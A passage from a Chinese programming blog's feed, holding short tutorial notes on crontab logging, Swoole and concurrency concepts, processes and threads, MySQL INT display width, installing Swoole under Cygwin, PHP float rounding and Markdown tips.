class="line">$ crontab -u &lt;username&gt; &lt;选项&gt;</span><br></pre></td></tr></table></figure><p>常用选项：<br><code>-e</code>：编辑任务<br><code>-l</code>：查看任务<br><code>-r</code>：删除任务</p><h4 id="查看-crontab-任务执行情况"><a href="#查看-crontab-任务执行情况" class="headerlink" title="查看 crontab 任务执行情况"></a>查看 crontab 任务执行情况</h4><p>当定时任务在指定时间执行时，会同步输出类似日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f &#x2F;var&#x2F;log&#x2F;syslog</span><br><span class="line">Nov 19 12:47:01 gigabit CRON[14521]: (root) CMD (&#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php)</span><br></pre></td></tr></table></figure><p>此时就可以肯定任务调度正常。</p><p>上面那种方式确实有效，但是并不方便，那么有没有更好的方式呢？</p><p>crontab 默认没有任务的执行记录日志，但是可以通过其他方式手动创建日志文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php &gt;&gt; &#x2F;var&#x2F;log&#x2F;cron.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在<code>script.php</code> 脚本最后面增加一次输出，这样每次执行完脚本就会将输出重定向至<code>cron.log</code> 日志文件了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.linuxprobe.com/how-to-crontab.html" target="_blank" rel="noopener">crontab用法与实例</a></li><li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">19. crontab 定时任务</a></li><li><a href="https://wzfou.com/crontab/#ftoc-heading-2" target="_blank" rel="noopener">Linux Crontab命令定时任务基本语法与操作教程-VPS/服务器自动化</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/zh-hans/Cron&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Crontab&lt;/a&gt; 是Unix 系统中基于时间的任务管理工具。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Crontab" scheme="https://www.0x2beace.com/tags/Crontab/"/>
    
  </entry>
  
  <entry>
    <title>Swoole 常见概念整理</title>
    <link href="https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/"/>
    <id>https://www.0x2beace.com/sorting-out-some-concepts-in-swoole/</id>
    <published>2020-10-25T12:24:52.000Z</published>
    <updated>2020-11-07T08:11:48.092Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.swoole.com/" target="_blank" rel="noopener">Swoole</a> 是一个非常优秀的PHP 的协程高性能网络通信引擎。</p><p>在学习过程中，遇到了一些新或旧的概念，在此整理一下。</p><a id="more"></a><h2 id="长连接-短连接"><a href="#长连接-短连接" class="headerlink" title="长连接/短连接"></a>长连接/短连接</h2><p>长连接： 客户端和服务端建立连接后不进行断开，之后客户端再次访问这个服务器上的内容时，继续使用这一条连接通道。<br>短连接： 客户端和服务端建立连接，发送完数据后立马断开连接。下次要取数据，需要再次建立连接。</p><h2 id="串行-并行-并发"><a href="#串行-并行-并发" class="headerlink" title="串行/并行/并发"></a>串行/并行/并发</h2><p>串行：执行多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。<br>并行：多个任务在同一时刻发生并执行。<br>并发：同一时刻需要执行N 个任务</p><h2 id="IO（Input-Output，输入输出）"><a href="#IO（Input-Output，输入输出）" class="headerlink" title="IO（Input/Output，输入输出）"></a>IO（Input/Output，输入输出）</h2><p>在计算机中，输入 / 输出（即 IO）是指信息处理系统（比如计算机）和外部世界（可以是人或其他信息处理系统）的通信。</p><p>输入是指系统接收的信号或数据，输出是指从系统发出的数据或信号。</p><p>涉及到IO 操作的通常有磁盘、网络、文件等。</p><h2 id="同步-异步"><a href="#同步-异步" class="headerlink" title="同步/异步"></a>同步/异步</h2><p><strong>同步和异步是一种消息通信机制</strong>。其关注点在于 <code>被调用者返回</code> 和 <code>结果返回</code> 之间的关系， 描述对象是被调用对象的行为。</p><p>同步：在发出一个同步调用后，没有得到结果返回之前，该调用就不会返回，只有等待结果返回之后才会继续执行后续操作。<br>异步：发出调用，直接返回。异步可以通过状态、回调、通知调用者结果，可以先执行其他操作，直到回调结果返回之后，再回来执行回调那部分的操作。</p><h2 id="阻塞-非阻塞"><a href="#阻塞-非阻塞" class="headerlink" title="阻塞/非阻塞"></a>阻塞/非阻塞</h2><p><strong>阻塞和非阻塞是一种业务流程处理方式</strong>。关注点在于调用发生时 <code>调用者状态</code> 和 <code>被调用者返回结果</code> 之间的关系。 </p><p>描述的是等待结果时候调用者的状态。 此时结果可能是同步返回的，也能是异步返回。</p><p>阻塞：在结果返回之前，该线程会被挂起，后续代码只有在结果返回后才能执行。<br>非阻塞：在不能立刻获取结果前，该调用不会阻塞当前线程。</p><h2 id="同步阻塞-非同步阻塞"><a href="#同步阻塞-非同步阻塞" class="headerlink" title="同步阻塞/非同步阻塞"></a>同步阻塞/非同步阻塞</h2><p>实际编程中，通过<strong>线程</strong>实现<strong>进程</strong>的<strong>同步非阻塞</strong>，通过<strong>协程</strong>实现<strong>线程</strong>的<strong>同步非阻塞</strong>。</p><p>同步阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），你一直等待老板给你结果，什么事也不做（阻塞）。</p><p>同步非阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），等电话的过程中你还一边嗑瓜子（非阻塞）。</p><h2 id="异步阻塞-异步非阻塞"><a href="#异步阻塞-异步非阻塞" class="headerlink" title="异步阻塞/异步非阻塞"></a>异步阻塞/异步非阻塞</h2><p>异步阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂了电话后（结束调用）, 除了等老板电话通知结果，什么事情也不做（阻塞）。</p><p>异步非阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂电话后（结束调用），一遍等电话，一遍嗑瓜子。（非阻塞）</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/articles/45280" target="_blank" rel="noopener">Swoole 中涉及的一些基本概念</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.swoole.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Swoole&lt;/a&gt; 是一个非常优秀的PHP 的协程高性能网络通信引擎。&lt;/p&gt;
&lt;p&gt;在学习过程中，遇到了一些新或旧的概念，在此整理一下。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>初始进程与线程</title>
    <link href="https://www.0x2beace.com/initial-process-and-thread/"/>
    <id>https://www.0x2beace.com/initial-process-and-thread/</id>
    <published>2020-10-24T13:50:46.000Z</published>
    <updated>2020-10-24T13:53:41.808Z</updated>
    
    <content type="html"><![CDATA[<p>关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。</p><a id="more"></a><h2 id="操作系统下的进程与线程"><a href="#操作系统下的进程与线程" class="headerlink" title="操作系统下的进程与线程"></a>操作系统下的进程与线程</h2><p>在正式介绍进程和线程之前，从操作系统的角度了解一下。</p><p>众所周知，现代的操作系统（Mac OS X，UNIX，Linux，Windows等）都是支持“多任务”的操作系统。</p><p>那么什么是“多任务”呢？简单的说，多任务就是同时运行多个任务，比如一边听歌，一边写博客。</p><p>多核 CPU可以直接同时运行多个任务，<br>而对于单核 CPU 来说，只能让系统轮流执行每个任务，因为任务之间切换很快，在宏观上看上去就是同时执行的了。</p><p>对于操作系统来说，一个任务就是一个进程。<br>而有的进程同时做几件事情，也就是同时运行多个子任务，我们把进程内的这类子任务称为线程。</p><p>由于每个进程至少要干一件事情，所以，<strong>一个进程至少有一个线程</strong>。</p><p>PHP 默认是执行单任务的进程，也就是只有一个线程。如果我们要同时执行多个任务怎么办？</p><p>有两种解决方案：</p><ol><li>启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。</li><li>启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。</li></ol><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>线程是最小的执行单元，而进程由至少一个线程组成，知道这一点后，再来理解多线程就不难了。</p><p><strong>多线程就是指一个进程中同时有多个线程正在执行。</strong></p><h3 id="为什么要使用多线程？"><a href="#为什么要使用多线程？" class="headerlink" title="为什么要使用多线程？"></a>为什么要使用多线程？</h3><p>对于一个程序来说，很多操作事非常耗时的，如数据库I/O操作、文件读写等。如果使用单线程，那么就只能等待该线程处理完这些操作之后，才能继续往下执行其他操作。</p><p>而如果使用多线程，就可以将耗时的那部分操作通过其他线程去执行，从而提高程序执行效率。</p><h3 id="多线程的缺点"><a href="#多线程的缺点" class="headerlink" title="多线程的缺点"></a>多线程的缺点</h3><ul><li>使用过多线程会过度消耗系统资源，因为创建线程需要开辟新的内存。</li><li>影响系统性能，操作系统需要来回对多线程进行切换。</li><li>同时还需要考虑线程异常（挂起、中止）时可能会对造成程序的影响。</li></ul><p>总结：<br>多线程是异步的，分别创建N 个线程并不能说明他们就是在同时运行，实际上是操作系统在各个线程之间来回切换，并且切换速度非常快，这也就造成了在宏观上给我们同时运行的错觉。</p><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><strong>多进程就是指计算机同时执行多个进程。</strong></p><h2 id="多进程还是多线程"><a href="#多进程还是多线程" class="headerlink" title="多进程还是多线程"></a>多进程还是多线程</h2><p>下面引用一个<a href="https://www.zhihu.com/question/19901763/answer/13299543" target="_blank" rel="noopener">知乎上的回答</a>，非常通俗的解释了选择多进程还是多线程的问题。</p><ul><li>单进程单线程：一个人在一个桌子上吃菜。</li><li>单进程多线程：多个人在同一个桌子上一起吃菜。</li><li>多进程单线程：多个人每个人在自己的桌子上吃菜。</li></ul><p>多线程的问题是多个人同时吃一道菜的时候容器发生争抢。例如两个人同时夹一个菜，一个人刚伸出筷子，结果伸到的时候菜已经被夹走了。通俗点说也就说资源共享容器发生冲突争抢。</p><p>对于Windows 系统来说，“开桌子”的开销很大，因此Windows 鼓励大家在一个桌子上吃菜。因此 Windows 多线程的学习重点是资源争抢与同步方面的问题。</p><p>而对于Linux 系统来说，“开桌子”的开销很小，因为Linux 鼓励大家尽量每个人都开自己的桌子吃菜。但这同事也带来了新的问题：两个人坐在不同的桌子上，说话不方便。因为，Linux 多线程的学习重点是进程之间的通讯方式。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923056118147584" target="_blank" rel="noopener">进程和线程</a></li><li><a href="https://www.cnblogs.com/linuxAndMcu/p/11064916.html" target="_blank" rel="noopener">多进程和多线程的概念</a></li><li><a href="https://www.zhihu.com/question/19901763/answer/13299543" target="_blank" rel="noopener">多线程有什么用？——知乎</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="进程" scheme="https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"/>
    
    <category term="线程" scheme="https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>MySQL Integer类型与INT(11)详解</title>
    <link href="https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/"/>
    <id>https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/</id>
    <published>2020-10-23T10:39:10.000Z</published>
    <updated>2020-10-23T10:39:49.036Z</updated>
    
    <content type="html"><![CDATA[<p>MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。</p><a id="more"></a><p>每种整数类型所需的存储空间和范围如下：<br>|类型|字节|最小值(有符号)|最大值(有符号)|最小值(无符号)|最大值(无符号)|<br>|-|-|-|-|-|-|<br>|TINYINT|1|-128|127|0|255|<br>|SMALLINT|2|-32768|32767|0|65535|<br>|MEDIUMINT|3|-8388608|8388607|0|16777215|<br>|INT|4|-2147483648|2147483647|0|4294967295|<br>|BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615|</p><h2 id="有无限制的区别"><a href="#有无限制的区别" class="headerlink" title="有无限制的区别"></a>有无限制的区别</h2><p>在创建数据表时，通常会看见 <code>int(11)</code>和<code>int</code>这样的写法，这两者有什么区别，各自又代表什么意思呢？</p><ol><li>对应Integer 类型而言，仅表示字段的显示宽度。</li><li>对于DECIMAL类型，表示数字的总数。</li><li>对于字符字段，这是可以存储的最大字符数，例如VARCHAR（20）可以存储20个字符。</li></ol><p><strong>显示宽度并不影响可以存储在该列中的最大值。</strong><code>int(3)</code>和<code>int(11)</code> 所能存储的最大范围是一样的。</p><p>将某个字段设置成<code>INT(20)</code>并不意味着将能够存储20位数字，这个字段最终能存储的最大范围还是 INT 的范围。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>创建一张临时表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp_table_a (</span><br><span class="line">    id INT(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">    name varchar(16) DEFAULT &#39;&#39; NOT NULL, </span><br><span class="line">    PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>查看表结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc tmp_table_a;</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int(3)      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(16) | NO   |     |         |                |</span><br><span class="line">+-------+-------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>插入超过”长度”的数字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;);</span><br></pre></td></tr></table></figure><p>查看结果，发现数字并没有插入失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tmp_table_a;</span><br><span class="line">+--------+------+</span><br><span class="line">| id     | name |</span><br><span class="line">+--------+------+</span><br><span class="line">| 123456 | boo  |</span><br><span class="line">+--------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="有无符号的区别"><a href="#有无符号的区别" class="headerlink" title="有无符号的区别"></a>有无符号的区别</h2><p>那么问题来了，既然加不加数字并没有什么区别，那为什么还多此一举呢？</p><p>这是因为“正常”情况下确实没有什么区别，只有当<strong>字段设置为UNSIGNED ZEROFILL 属性时</strong>，为INT 增加数字才会有意义。</p><p>表示如果要存储的数字少于N 个字符，则这些数字将在左侧补零。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>创建一张 UNSIGNED ZEROFILL 的数据表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp_table_b (</span><br><span class="line">    id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT,</span><br><span class="line">    name varchar(16) DEFAULT &#39;&#39; NOT NULL, </span><br><span class="line">    PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>查看表结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc tmp_table_b;</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type                     | Null | Key | Default | Extra          |</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int(3) unsigned zerofill | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(16)              | NO   |     |         |                |</span><br><span class="line">+-------+--------------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>插入记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;);</span><br></pre></td></tr></table></figure><p>查看记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tmp_table_b;</span><br><span class="line">+-----+------+</span><br><span class="line">| id  | name |</span><br><span class="line">+-----+------+</span><br><span class="line">| 001 | boo  |</span><br><span class="line">+-----+------+</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>对于Integer 类型而言，“数字”并不会限制其能存储的最大范围。</li><li>有无符号，不仅会限制其能存储的最大范围，还可以配置“数字”自动补零。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/polk6/p/11595107.html" target="_blank" rel="noopener">MySQL Integer类型与INT(11)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Windows 如何安装 Swoole？</title>
    <link href="https://www.0x2beace.com/how-to-install-swoole-on-windows/"/>
    <id>https://www.0x2beace.com/how-to-install-swoole-on-windows/</id>
    <published>2020-10-21T11:56:53.000Z</published>
    <updated>2020-11-26T10:19:33.578Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.swoole.com/" target="_blank" rel="noopener">Swoole</a> 是一个 PHP 的协程高性能网络通信引擎。</p><a id="more"></a><p>目前仅支持 Linux(2.3.32 以上内核)、FreeBSD、MacOS 三种操作系统，它并不支持直接在 Windows 下安装，因为Windows 系统默认没有以下软件：</p><ul><li>gcc-4.8 或更高版本</li><li>make</li><li>autoconf</li></ul><p>如果一定要在Windows 系统中使用，则可以使用 <a href="http://cygwin.com/" target="_blank" rel="noopener">CygWin</a> 或 WSL(Windows Subsystem for Linux) 。</p><p>这篇笔记并不介绍如何在Windows 系统中，安装Cygwin，如果需要，可以参考<a href="https://www.0x2beace.com/cygwin-quick-start/">Cygwin 快速上手</a> 。</p><p>需要注意的是，在安装Cygwin 时，记得勾选以下软件包：</p><ul><li>gcc、gcc++</li><li>autoconf</li><li>php-devel</li><li>pcre2 </li></ul><h2 id="安装Swoole"><a href="#安装Swoole" class="headerlink" title="安装Swoole"></a>安装Swoole</h2><h3 id="1-可以通过以下方式下载-Swoole"><a href="#1-可以通过以下方式下载-Swoole" class="headerlink" title="1. 可以通过以下方式下载 Swoole"></a>1. 可以通过以下方式下载 Swoole</h3><ul><li><a href="https://github.com/swoole/swoole-src/releases" target="_blank" rel="noopener">github</a></li><li><a href="https://pecl.php.net/package/swoole" target="_blank" rel="noopener">pecl</a></li><li><a href="https://gitee.com/swoole/swoole/tags" target="_blank" rel="noopener">gitee</a></li></ul><h3 id="2-从源码编译安装"><a href="#2-从源码编译安装" class="headerlink" title="2. 从源码编译安装"></a>2. 从源码编译安装</h3><p>下载源代码包后，将其拷贝至 Cygwin 的home 目录，解压并进入文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf swoole-src.tgz</span><br></pre></td></tr></table></figure><p>编译安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd swoole-src &amp;&amp; \</span><br><span class="line">phpize &amp;&amp; \</span><br><span class="line">.&#x2F;configure &amp;&amp; \</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>如果因为某个软件包缺失而导致编译安装失败，则可以重新安装 Cygwin（重新安装不用卸载之间的版本，直接在此安装就好了）。</p><h3 id="3-启用扩展"><a href="#3-启用扩展" class="headerlink" title="3. 启用扩展"></a>3. 启用扩展</h3><p>编译安装到系统成功后，需要在 php.ini 中加入一行 <code>extension=swoole.so</code> 来启用 Swoole 扩展。</p><p>需要注意的是，通过这种方式安装的Swoole，最终存在于Cygwin 环境中，与宿主机中的PHP 版本无关。</p><p>通过<code>php -m | grep  swoole</code>查看是否安装成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.swoole.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Swoole&lt;/a&gt; 是一个 PHP 的协程高性能网络通信引擎。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Cygwin" scheme="https://www.0x2beace.com/tags/Cygwin/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="Swoole" scheme="https://www.0x2beace.com/tags/Swoole/"/>
    
  </entry>
  
  <entry>
    <title>PHP 常见浮点数操作</title>
    <link href="https://www.0x2beace.com/php-common-floating-point-operations/"/>
    <id>https://www.0x2beace.com/php-common-floating-point-operations/</id>
    <published>2020-10-20T11:24:23.000Z</published>
    <updated>2020-10-20T11:35:47.611Z</updated>
    
    <content type="html"><![CDATA[<p>浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。</p><a id="more"></a><h2 id="保留N位小数做四舍五入"><a href="#保留N位小数做四舍五入" class="headerlink" title="保留N位小数做四舍五入"></a>保留N位小数做四舍五入</h2><p>想要保留N 位小数同时做四舍五入的方式还是挺多的，下面列举常用的几种。</p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><p><a href="https://www.php.net/manual/zh/function.sprintf.php" target="_blank" rel="noopener">sprintf</a> 函数用于返回一个格式化之后的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36</span><br></pre></td></tr></table></figure><p><code>%.2f</code> 是目标格式，其中2 表示2 位，<code>f</code>表示视为浮点数。</p><h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3><p><a href="https://www.php.net/manual/zh/function.round" target="_blank" rel="noopener">round</a> 函数用于对浮点数进行四舍五入。</p><p>还可以通过传入参数，决定从第几位开始四舍五入。如果没有参数，默认从小数点后一位开始四舍五入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo round(3.4);         &#x2F;&#x2F; 3</span><br><span class="line">echo round(3.5);         &#x2F;&#x2F; 4</span><br><span class="line">echo round(22.356, 2);   &#x2F;&#x2F; 22.36</span><br></pre></td></tr></table></figure><h2 id="保留N位小数不做四舍五入"><a href="#保留N位小数不做四舍五入" class="headerlink" title="保留N位小数不做四舍五入"></a>保留N位小数不做四舍五入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1));  &#x2F;&#x2F; 22.35</span><br></pre></td></tr></table></figure><h2 id="获取小数位长度"><a href="#获取小数位长度" class="headerlink" title="获取小数位长度"></a>获取小数位长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num &#x3D; 22.356;</span><br><span class="line">echo strlen(substr(strrchr($num, &quot;.&quot;), 1));  &#x2F;&#x2F; 3</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>关于 Markdown 的一些技巧</title>
    <link href="https://www.0x2beace.com/some-tips-about-markdown/"/>
    <id>https://www.0x2beace.com/some-tips-about-markdown/</id>
    <published>2020-10-19T14:04:23.000Z</published>
    <updated>2020-10-20T11:23:53.460Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。</p><a id="more"></a><blockquote><p>什么是Markdown？</p></blockquote><p>Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯。它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。 —— 维基百科</p><h2 id="Markdown-高级技巧"><a href="#Markdown-高级技巧" class="headerlink" title="Markdown 高级技巧"></a>Markdown 高级技巧</h2><p>在Markdown 中，可以直接插入 HTML，目前支持的HTML 元素有：</p><ul><li><code>&lt;kbd&gt;</code></li><li><code>&lt;b&gt;</code></li><li><code>&lt;i&gt;</code></li><li><code>&lt;em&gt;</code></li><li><code>&lt;sub&gt;</code></li><li><code>&lt;sup&gt;</code></li><li><code>&lt;br&gt;</code></li><li>等</li></ul><h3 id="键盘标签"><a href="#键盘标签" class="headerlink" title="键盘标签"></a>键盘标签</h3><p>可以使用<code>&lt;kbd&gt;</code>标签使文本看起来像按钮，这与常规反引号文本略有不同。</p><blockquote><p>Copy code with <kbd>Control</kbd> + <kbd>C</kbd></p></blockquote><h3 id="可视化差异"><a href="#可视化差异" class="headerlink" title="可视化差异"></a>可视化差异</h3><p>可以使用反引号可视化差异，并<code>diff</code>根据需要突出显示红色或绿色的线。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 PRINT “BASIC IS COOL”</span><br><span class="line"><span class="deletion">- 20 GOTO 11</span></span><br><span class="line"><span class="addition">+ 20 GOTO 10</span></span><br></pre></td></tr></table></figure><h3 id="隐藏不必要的输出"><a href="#隐藏不必要的输出" class="headerlink" title="隐藏不必要的输出"></a>隐藏不必要的输出</h3><p>添加冗长的错误日志或冗长程序输出的问题可以解决的错误有帮助的，但如果它占用页的垂直空间，可以考虑使用<code>&lt;details&gt;</code>和<code>&lt;summary&gt;</code>标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;details&gt;</span><br><span class="line">&lt;summary&gt;git clone 成功，点击查看详情信息&lt;&#x2F;summary&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">Cloning into &#39;php-markdown-blog&#39;...</span><br><span class="line">remote: Enumerating objects: 67, done.</span><br><span class="line">remote: Counting objects: 100% (67&#x2F;67), done.</span><br><span class="line">remote: Compressing objects: 100% (55&#x2F;55), done.</span><br><span class="line">remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (67&#x2F;67), done.</span><br><span 